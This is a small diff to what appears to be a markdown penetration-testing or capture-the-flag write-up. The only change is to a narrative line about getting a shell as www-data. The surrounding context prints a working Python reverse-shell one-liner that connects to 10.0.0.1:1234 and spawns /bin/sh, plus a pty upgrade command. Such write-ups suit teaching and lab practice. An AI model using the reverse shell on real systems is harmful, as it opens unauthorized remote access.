@@ -53,7 +53,7 @@
 
 ``python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``
 
-+ **And here it's our shell, connected with the www-data user. Let's upgrade it to an interactive one**
+ **And here it's our shell, connected with the www-data user. Let's upgrade it to an interactive one**
 
 ``python3 -c 'import pty; pty.spawn("/bin/bash")'``
 
